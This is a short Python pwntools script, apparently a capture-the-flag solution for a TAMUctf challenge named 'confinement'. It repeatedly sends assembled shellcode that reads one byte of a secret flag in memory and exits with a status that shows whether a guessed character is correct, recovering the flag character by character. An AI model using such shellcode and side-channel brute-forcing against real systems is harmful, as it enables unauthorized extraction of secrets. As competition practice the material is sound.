from pwn import *

elf = context.binary = ELF("./confinement",checksec=False)
# p = elf.process()
# p = remote("tamuctf.com", 443, ssl=True, sni="confinement")

context.arch = "amd64"

# gdb.attach(p,'''
#     init-gef
#     set follow-fork-mode child
#     b *main+180
#     c
#     si
# ''')
flag = ""
for j in range(0x30):
    for i in range(0x20, 0x7f):
        p = remote("tamuctf.com", 443, ssl=True, sni="confinement", level="error")
        payload = asm(f'''
            mov rdi, 0x24d50
            add r12, rdi
            xor edi, edi
            mov dil, [r12 + {str(j)}]
            sub rdi, {str(i)}
            mov rax, 231
            syscall
        ''')
        p.send(payload)
        x = p.recvline()
        print(flag,hex(j),hex(i))
        # print(x)  
        if(b"adios" in x):
            flag += chr(i)
            if(chr(i) == "}"):
                print("flag =",flag)
                exit(0)
            print(flag)
            break
        p.close()

# p.interactive()